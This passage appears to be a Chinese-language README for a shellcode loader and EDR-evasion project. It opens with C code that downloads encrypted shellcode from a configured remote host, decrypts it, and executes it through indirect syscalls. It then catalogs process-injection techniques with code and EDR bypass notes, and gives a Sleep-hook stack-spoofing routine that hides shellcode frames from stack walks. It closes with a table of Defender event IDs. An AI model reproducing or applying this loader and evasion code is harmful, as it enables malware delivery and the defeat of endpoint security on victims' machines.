			char c = config_plain[i];
			if (c < 0x20 || c > 0x7E) break;
			if (c == '|') break;
			host[j++] = c; i++;
		}
		host[j] = '\0'; i++;
		
		j = 0;
		while (config_plain[i] && j < 15) {
			char c = config_plain[i];
			if (c < 0x20 || c > 0x7E) break;
			if (c == '|') break;
			port[j++] = c; i++;
		}
		port[j] = '\0'; i++;
		
		j = 0;
		while (config_plain[i] && j < 255) {
			char c = config_plain[i];
			if (c < 0x20 || c > 0x7E) break;
			if (c == '|') break;
			path[j++] = c; i++;
		}
		path[j] = '\0';
	}
	
	/* ---------- 5. 下载加密 Shellcode ---------- */
	payload_size = DownloadPayload(host, port, path,
		payload_buf, sizeof(payload_buf));
	if (payload_size == 0) return 1;
	
	/* ---------- 6. 分配内存（走间接 syscall） ---------- */
	region_size = payload_size;
	status = g_NtAllocateVirtualMemory(
		NtCurrentProcess(), &exec_mem, 0, &region_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 7. 复制 + AES 解密 ---------- */
	memcpy(exec_mem, payload_buf, payload_size);
	aes_decrypt_buffer((unsigned char*)exec_mem, payload_size, aes_key, aes_iv);
	
	/* ---------- 8. 改权限（走间接 syscall） ---------- */
	status = g_NtProtectVirtualMemory(
		NtCurrentProcess(), &exec_mem, &region_size,
		PAGE_EXECUTE_READ, &old_protect);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 9. 执行 ---------- */
	((void(*)())exec_mem)();
	
	return 0;
}
```

![image-20260925145131608](README/image-20260925145131608.png)

# Note1

常见的进程注入方式

 **经典 CreateRemoteThread 注入**

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize,
                                   MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, remoteMem, payload, payloadSize, NULL);
VirtualProtectEx(hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
CreateRemoteThread(hProcess, NULL, 0, remoteMem, NULL, 0, NULL);
```

关键点

- `OpenProcess` 需要足够权限，通常要 `PROCESS_ALL_ACCESS` 或至少 `PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD`。
- `VirtualAllocEx` 在目标进程分配内存，初始权限 `PAGE_READWRITE`。
- `WriteProcessMemory` 写入 shellcode。
- `VirtualProtectEx` 改为 `PAGE_EXECUTE_READ`，准备执行。
- `CreateRemoteThread` 创建远程线程，入口点指向 shellcode。

EDR 检测点

- `OpenProcess` 请求高权限，尤其是对系统进程。
- `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` 组合，这是最经典的注入链。
- 远程线程的起始地址不在任何已加载模块内。
- 内存页从 RW 变成 RX，且包含可执行代码。
- 跨进程写入行为，尤其是写入后立即创建线程。

优缺点

- **优点**：实现简单，兼容性好。
- **缺点**：检测特征极其明显，现代 EDR 基本都能捕获。

**NtCreateThreadEx：更底层的调用**

`kernel32.dll` 的 `CreateRemoteThread` 内部会调用 `ntdll.dll` 的 `NtCreateThreadEx`。有些 EDR 只 Hook 了 `kernel32` 的 API，没有 Hook `ntdll`，因此直接调用 `NtCreateThreadEx` 可以绕过部分用户态 Hook。

```c
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG,
    SIZE_T, SIZE_T, SIZE_T, PVOID
);
// 从 ntdll.dll 动态获取 NtCreateThreadEx → 直接调用
```

关键点

- 通过 `GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx")` 获取函数地址。
- 直接发起系统调用，跳过 `kernel32` 层的 Hook。
- 但现代 EDR 往往同时 Hook `ntdll`，甚至使用内核回调（如 `PsSetCreateThreadNotifyRoutine`）来监控线程创建。

检测点

- 即使绕过用户态 Hook，内核回调仍能看到线程创建。
- 远程线程起始地址、线程创建来源进程等。
- 直接调用 `ntdll` 的未导出或底层函数本身也可能是可疑行为。

优缺点

- **优点**：绕过部分用户态 Hook。
- **缺点**：内核层监控难以绕过；需要动态解析函数地址。

**进程镂空（Process Hollowing）**

启动一个挂起状态的新进程（通常是合法系统进程，如 `svchost.exe`），然后：

1. 卸载其原始镜像。
2. 在相同地址空间写入恶意 PE。
3. 修改入口点。
4. 恢复线程执行。

流程：

```c
CreateProcessA("C:\\Windows\\System32\\svchost.exe", ...,
               CREATE_SUSPENDED, ..., &pi);
// 1. 获取挂起进程的上下文
// 2. 从 PEB 中拿到 ImageBase
// 3. NtUnmapViewOfSection → 卸载原始镜像
// 4. VirtualAllocEx → 分配新内存
// 5. WriteProcessMemory → 写入恶意 PE
// 6. SetThreadContext → 修改入口点
// 7. ResumeThread → 恢复执行
```

关键点

- 使用 `CREATE_SUSPENDED` 创建进程，主线程挂起。
- `NtUnmapViewOfSection` 卸载原镜像，为恶意 PE 腾出空间。
- 写入完整的 PE 或 shellcode，然后修改线程上下文中的 `RIP`/`EIP` 指向新入口点。
- 恢复线程后，进程名是 `svchost.exe`，但执行的是恶意代码。

检测点

- 进程创建后立即挂起，内存被修改。
- `NtUnmapViewOfSection` 调用。
- 进程的映像基址与实际磁盘文件不匹配。
- 内存中的 PE 与磁盘上的 PE 不一致（内存扫描）。
- 线程上下文被修改。
- EDR 可以检查进程的 `PEB`、`ImageBase`、内存映射。

优缺点

- **优点**：进程名合法，网络行为可能被误认为合法进程。
- **缺点**：行为链明显，内存扫描容易发现；现代 EDR 对进程镂空有专门检测。

**APC 注入（Asynchronous Procedure Call）**

APC 是 Windows 的一种异步回调机制。每个线程都有一个 APC 队列，当线程进入可警报状态时，系统会执行队列中的 APC。攻击者可以把 shellcode 地址插入目标线程的 APC 队列，线程下次调度时自动执行。

```c
QueueUserAPC(payload, hThread, 0);
```

通常需要：

- 打开目标进程和线程。
- 在目标进程分配内存并写入 shellcode。
- 调用 `QueueUserAPC`，将 shellcode 地址作为 APC 函数。

关键点

- 不需要创建新线程，因此绕过了“检测远程线程创建”的规则。
- 目标线程必须处于可警报状态（如 `WaitForSingleObjectEx`、`SleepEx` 等），否则 APC 不会执行。
- 常见目标：新创建的挂起进程的主线程，因为它在加载完成后会进入可警报等待。

检测点

- `QueueUserAPC` 调用本身可能被 Hook。
- 跨进程写入内存。
- 线程 APC 队列中出现非模块地址。
- 执行时内存页权限异常。

优缺点

- **优点**：不创建新线程，行为更隐蔽。
- **缺点**：需要等待线程进入可警报状态；EDR 可监控 APC 队列。

**线程劫持（Thread Hijacking）**

暂停目标进程的一个现有线程，修改其上下文中的指令指针（`RIP`/`EIP`）指向 shellcode，然后恢复线程。这样恶意代码就在现有线程中执行，不创建新线程。

```c
SuspendThread(hThread);
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)remoteShellcode;  // x64
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

关键点

- 需要 `SuspendThread`、`GetThreadContext`、`SetThreadContext`、`ResumeThread`。
- 目标线程被暂停，修改上下文，恢复后从 shellcode 开始执行。
- 执行完后可能需要恢复原上下文，否则线程会崩溃。

检测点

- 线程被暂停后上下文被修改。
- `SetThreadContext` 调用。
- 线程的 `RIP` 指向非模块内存。
- 线程执行流突然跳转到未知区域。

优缺点

- **优点**：不创建新线程，绕过线程创建监控。
- **缺点**：修改现有线程风险高，容易导致目标进程不稳定；EDR 可监控上下文修改。

**Atom Bombing**

利用 Windows 全局 Atom 表传递 shellcode。Atom 表是系统全局的字符串存储机制，可以通过 `GlobalAddAtom` 添加字符串，通过 `GlobalGetAtomName` 读取。

攻击流程：

1. 将 shellcode 分块写入全局 Atom 表。
2. 在目标进程中通过 `GlobalGetAtomName` 读取这些 Atom，拼接成完整 shellcode。
3. 配合 APC 注入或其他方式执行。

```c
GlobalAddAtomA(shellcode_chunk);
// 目标进程中 GlobalGetAtomNameA 读取
// 配合 APC 注入执行
```

关键点

- Atom 表是全局的，跨进程可读。
- 不需要 `WriteProcessMemory`，因此绕过了跨进程写入检测。
- 通常与 APC 注入结合，因为 APC 可以在目标进程中执行代码，而代码中调用 `GlobalGetAtomName` 获取 shellcode。

检测点

- 大量 `GlobalAddAtom` 调用，尤其是二进制数据。
- 目标进程中 `GlobalGetAtomName` 后跟着内存分配和执行。
- Atom 表异常增长。

优缺点

- **优点**：避免跨进程写入，绕过部分检测。
- **缺点**：实现复杂，Atom 表大小有限；EDR 可监控 Atom 操作。

**回调注入（Callback Injection）**

```c
// 利用SetWinEventHook → 设置全局事件钩子
// → 事件触发时系统自动在目标进程中执行回调函数
SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_CREATE,
                NULL, shellcode, targetPid, targetTid,
                WINEVENT_OUTOFCONTEXT);

// 还有:
// - SetThreadpoolTimer → 线程池定时器回调
// - QueueUserWorkItem → 线程池工作项回调
// - CertEnumSystemStore → 证书枚举回调
// - CreateTimerQueueTimer → 定时器回调
```

# Note2

**栈帧欺骗伪造——休眠欺骗**

项目地址

 [ThreadStackSpoofer/ThreadStackSpoofer/main.cpp at master · mgeeky/ThreadStackSpoofer · GitHub](https://github.com/mgeeky/ThreadStackSpoofer/blob/master/ThreadStackSpoofer/main.cpp)

参考文章

[调用栈欺骗（Callstack Spoofing） | oneday](https://onedays12.github.io/2026/03/27/调用栈欺骗（Callstack-Spoofing）/#二、被动欺骗)

原理如下

进入当执行shellcode的时候调用runshellcode之后需要进行休眠调用sleep的时候这里sleep在此之前已经被HOOK了然后会进行调用MySleep函数，这个函数会保存调用shellcode调用Sleep（已Hook）的下一条指令，然后对其进行清0，这样在Windows机制中 `RtlVirtualUnwind` 在回溯到这一帧时，会认为已经到达了调用栈的底部（因为返回地址为 `0`），从而**停止回溯**。弊端是这个也是一个异常点栈无法进行回溯但是对于只直接针对 EDR 的栈回溯检测点来说可以进行绕过。

执行流如下

```
线程入口
  → runShellcode()          // 项目自己的函数
    → shellcode()           // 注入的 shellcode
      → Sleep(1000)         // 被 Hook，实际跳到 MySleep
        → MySleep(1000)
          → SleepEx(1000, TRUE)  // 真正进入内核等待
```

这里调用SleepEx执行真正的休眠任务因为此时Sleep已经被Hook了

MySleep的大致实现

```c
void WINAPI MySleep(DWORD dwMilliseconds) {
    // 1. 找到当前栈帧中保存的返回地址
    //    这个返回地址指向 shellcode 中调用 Sleep 之后的下一条指令
    PVOID* pReturnAddress = (PVOID*)_AddressOfReturnAddress();
    PVOID originalReturnAddress = *pReturnAddress;

    // 2. 把返回地址写 0
    *pReturnAddress = NULL;

    // 3. 真正进入等待
    SleepEx(dwMilliseconds, false);

    // 4. 恢复返回地址
    *pReturnAddress = originalReturnAddress;
}
```

```
当前帧：SleepEx
  → 读取 SleepEx 的返回地址 → 指向 MySleep 内部
调用者帧：MySleep
  → 读取 MySleep 的返回地址 → 指向 shellcode   ← 这里被清零了
调用者帧：？
  → 返回地址为 0 → 栈展开终止
```

当 EDR 回溯到 `MySleep` 帧，读取它的返回地址时，得到 `0`。`RtlVirtualUnwind` 遇到 `0` 就无法继续，栈展开在这里**停止**。于是 EDR 看到的调用栈是：

```
ntdll!NtDelayExecution
ntdll!SleepEx
MySleep
0x0   ← 栈终止，下面（shellcode 相关的帧）全部不可见
```

Hook之前栈帧展开

```
ntdll!NtDelayExecution
ntdll!SleepEx
kernel32!Sleep
shellcode+0x123        ← 可疑：非模块内存
runShellcode+0x45      ← 可疑：非模块内存
kernel32!BaseThreadInitThunk
ntdll!RtlUserThreadStart
```

Hook之后栈帧展开

```
ntdll!NtDelayExecution
ntdll!SleepEx
MySleep
0x0                    ← 栈展开终止
```

修改之后的Sleep

![image-20261010165027909](README/image-20261010165027909.png)

![image-20261010165048688](README/image-20261010165048688.png)

原始字节

![image-20261012141835945](README/image-20261012141835945.png)

hook之后字节

![image-20261012142015310](README/image-20261012142015310.png)

```
0x7FF6963C1037
```

![image-20261012142050343](README/image-20261012142050343.png)

注入shellcode内容

![image-20261012142213902](README/image-20261012142213902.png)

# Note3

Windows Defender日志事件查看

| 事件 ID  | 含义                                       |
| :------- | :----------------------------------------- |
| **1116** | 检测到恶意软件或其他潜在有害软件。         |
| **1117** | 已对恶意软件采取保护措施（如清理、隔离）。 |
| **1118** | 尝试采取保护措施但失败。                   |
| **1119** | 采取行动时遇到严重错误。                   |
| **5001** | 实时保护已禁用。                           |
| **5007** | 防恶意软件平台配置已更改。                 |
